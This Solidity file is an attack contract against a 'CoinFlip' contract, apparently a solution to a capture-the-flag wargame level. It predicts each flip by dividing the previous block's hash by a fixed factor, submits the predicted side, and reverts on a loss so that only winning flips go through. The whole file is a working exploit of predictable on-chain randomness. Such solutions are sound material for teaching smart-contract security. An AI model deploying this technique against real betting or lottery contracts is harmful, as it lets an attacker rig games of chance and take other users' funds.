// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract Attack {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private coinFlipContract;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Sender not Owner");
        _;
    }

    constructor(address _coinFlipAddress, address _owner) {
        coinFlipContract = CoinFlip(_coinFlipAddress);
        owner = _owner;
    }

    function attack() public onlyOwner {
        bool side = getGuess();

        bool isFlipWin = coinFlipContract.flip(side);

        if (!isFlipWin) {
            revert();
        }
    }

    function getGuess() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("Same block so reverted");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
